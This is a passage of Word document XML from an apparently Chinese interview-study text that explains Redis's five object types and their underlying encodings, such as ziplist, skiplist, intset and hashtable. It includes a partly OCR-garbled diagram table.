    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="27"/>
        <w:keepNext/>
        <w:keepLines/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="16"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="575"/>
        </w:tabs>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="280" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0" w:right="0" w:firstLine="0"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:bookmarkStart w:id="93" w:name="bookmark104"/>
      <w:bookmarkEnd w:id="93"/>
      <w:bookmarkStart w:id="94" w:name="bookmark105"/>
      <w:bookmarkStart w:id="95" w:name="bookmark102"/>
      <w:bookmarkStart w:id="96" w:name="bookmark103"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>redis</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
        </w:rPr>
        <w:t>的对象类型有哪些，底层的数据结构。(主要是有</w:t>
      </w:r>
      <w:bookmarkEnd w:id="94"/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="27"/>
        <w:keepNext/>
        <w:keepLines/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:bookmarkStart w:id="97" w:name="bookmark106"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
        </w:rPr>
        <w:t>序列表的底层实现)</w:t>
      </w:r>
      <w:bookmarkEnd w:id="95"/>
      <w:bookmarkEnd w:id="96"/>
      <w:bookmarkEnd w:id="97"/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="480" w:right="0" w:firstLine="20"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>Redis</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>的五大数据类型也称五大数据对象；前面介绍过6大数据结构，</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>Redis</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve">并没有直 接使用这些结构来实现键值对数据库，而是使用这些结构构建了一个对象系统 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>redisObject;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>这个对象系统包含了五大数据对象，字符串对象</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>(string)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>、列表对象</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:br w:type="page"/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>(list)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>、哈希对象</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>(hash)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>、集合</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>(set)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>对象和有序集合对象</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>(zset)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>;而这五大 对象的底层数据编码可以用命令</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>OBJECT ENCODING</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>来进行查看。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="17"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="335"/>
        </w:tabs>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:bookmarkStart w:id="98" w:name="bookmark107"/>
      <w:bookmarkEnd w:id="98"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>字符串对象</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>(string)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>:字符串对象底层数据结构实现为简单动态字符串(</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>SDS)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>和直接 存储，但其编码方式可以是</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>int、raw</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>或者</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>emb str,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>区别在于内存结构的不同。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="17"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="335"/>
        </w:tabs>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:bookmarkStart w:id="99" w:name="bookmark108"/>
      <w:bookmarkEnd w:id="99"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>列表对象</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>(list)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>:列表对象的编码可以是</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>ziplist</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>和</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>linkedlist。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="17"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="335"/>
        </w:tabs>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:bookmarkStart w:id="100" w:name="bookmark109"/>
      <w:bookmarkEnd w:id="100"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>哈希对象</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>(hash)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>:哈希对象的编码可以是</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>ziplist</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>和</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>hashtable o</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="17"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="335"/>
        </w:tabs>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:bookmarkStart w:id="101" w:name="bookmark110"/>
      <w:bookmarkEnd w:id="101"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>集合对象</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>(set)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>:集合对象的编码可以是</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>intset</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>和</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>hashtable o</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="17"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="335"/>
        </w:tabs>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:bookmarkStart w:id="102" w:name="bookmark111"/>
      <w:bookmarkEnd w:id="102"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>有序集合对象</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>(zset)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>:有序集合的编码可以是</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>ziplist</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>和</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>skiplist。</w:t>
      </w:r>
    </w:p>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TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve">(1) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">ziplist </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>编码</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="120" w:line="330" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>ziplist</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>编码的有序集合对象底层实现是压缩列表，其结构与哈希对象类似，不同的是 两个紧密相连的压缩列表节点，第一个保存元素的成员，第二个保存元素的分值，而且 分值小的靠近表头，大的靠近表尾。</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="2"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:jc w:val="right"/>
        <w:tblLayout w:type="fixed"/>
        <w:tblCellMar>
          <w:top w:w="0" w:type="dxa"/>
          <w:left w:w="10" w:type="dxa"/>
          <w:bottom w:w="0" w:type="dxa"/>
          <w:right w:w="10" w:type="dxa"/>
        </w:tblCellMar>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="2595"/>
        <w:gridCol w:w="5370"/>
      </w:tblGrid>
      <w:tr>
        <w:tblPrEx>
          <w:tblCellMar>
            <w:top w:w="0" w:type="dxa"/>
            <w:left w:w="10" w:type="dxa"/>
            <w:bottom w:w="0" w:type="dxa"/>
            <w:right w:w="10" w:type="dxa"/>
          </w:tblCellMar>
        </w:tblPrEx>
        <w:trPr>
          <w:trHeight w:val="285" w:hRule="exact"/>
          <w:jc w:val="right"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcBorders>
              <w:top w:val="single" w:color="auto" w:sz="4" w:space="0"/>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redisObject</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:vMerge w:val="restart"/>
            <w:tcBorders>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280" w:firstLine="0"/>
              <w:jc w:val="right"/>
              <w:rPr>
                <w:sz w:val="12"/>
                <w:szCs w:val="12"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="000000"/>
                <w:spacing w:val="0"/>
                <w:w w:val="100"/>
                <w:position w:val="0"/>
                <w:sz w:val="12"/>
                <w:szCs w:val="12"/>
                <w:lang w:val="zh-CN" w:eastAsia="zh-CN" w:bidi="zh-CN"/>
              </w:rPr>
              <w:t>分</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="000000"/>
                <w:spacing w:val="0"/>
                <w:w w:val="100"/>
                <w:position w:val="0"/>
                <w:sz w:val="12"/>
                <w:szCs w:val="12"/>
                <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
              </w:rPr>
              <w:t>■■夕帥■二紡分・■大•!、•</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:pStyle w:val="17"/>
              <w:keepNext w:val="0"/>
              <w:keepLines w:val="0"/>
              <w:widowControl w:val="0"/>
              <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
              <w:tabs>
                <w:tab w:val="left" w:pos="3205"/>
                <w:tab w:val="left" w:pos="4165"/>
              </w:tabs>
              <w:bidi w:val="0"/>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
              <w:ind w:left="2140" w:right="0" w:firstLine="0"/>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="000000"/>
                <w:spacing w:val="0"/>
                <w:w w:val="100"/>
                <w:position w:val="0"/>
                <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
              </w:rPr>
              <w:t>1</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="000000"/>
                <w:spacing w:val="0"/>
                <w:w w:val="100"/>
                <w:position w:val="0"/>
                <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="000000"/>
                <w:spacing w:val="0"/>
                <w:w w:val="100"/>
                <w:position w:val="0"/>
                <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
              </w:rPr>
              <w:t>/ \</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="000000"/>
                <w:spacing w:val="0"/>
                <w:w w:val="100"/>
                <w:position w:val="0"/>
                <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="000000"/>
                <w:spacing w:val="0"/>
                <w:w w:val="100"/>
                <w:position w:val="0"/>
                <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
              </w:rPr>
              <w:t>.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tblPrEx>
          <w:tblCellMar>
            <w:top w:w="0" w:type="dxa"/>
            <w:left w:w="10" w:type="dxa"/>
            <w:bottom w:w="0" w:type="dxa"/>
            <w:right w:w="10" w:type="dxa"/>
          </w:tblCellMar>
        </w:tblPrEx>
        <w:trPr>
          <w:trHeight w:val="510" w:hRule="exact"/>
          <w:jc w:val="right"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcBorders>
              <w:top w:val="single" w:color="auto" w:sz="4" w:space="0"/>
              <w:left w:val="single" w:color="auto" w:sz="4" w:space="0"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
            <w:vAlign w:val="center"/>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REDIS ZSET</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:vMerge w:val="continue"/>
            <w:tcBorders>
              <w:left w:val="single" w:color="auto" w:sz="4" w:space="0"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p/>
        </w:tc>
      </w:tr>
      <w:tr>
